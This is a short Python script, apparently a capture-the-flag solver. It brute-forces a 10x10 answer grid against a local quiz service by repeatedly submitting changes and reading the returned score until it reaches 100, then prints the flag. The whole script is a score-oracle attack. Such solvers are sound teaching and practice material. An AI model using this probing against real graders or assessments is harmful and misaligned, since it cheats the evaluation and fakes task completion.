import requests
import json
import os
from tqdm import tqdm

HOST = os.getenv("HOST", "localhost")
PORT = os.getenv("PORT", "8888")
URL = f"http://{HOST}:{PORT}"

def get_score(answers):
    global cookies
    r = requests.post(f"{URL}/api/submit",
                      headers={"Content-Type": "application/json"},
                      data=json.dumps(answers),
                      cookies=cookies)
    r = requests.get(f"{URL}/api/score", cookies=cookies)
    return json.loads(r.text)["data"]["score"]

r = requests.post(f"{URL}/api/start")
cookies = r.cookies

answers = [
    [0 for i in range(10)]
    for j in range(10)
]
base_score = get_score(answers)

for i in tqdm(range(10)):
    for j in range(10):
        for c in range(1, 4):
            answers[i][j] = c
            score = get_score(answers)
            if score > base_score:
                base_score = score
                break
            elif score < base_score:
                answers[i][j] = 0
                break
        if score == 100: break

r = requests.get(f"{URL}/api/score", cookies=cookies)
print(json.loads(r.text)["data"]["flag"])
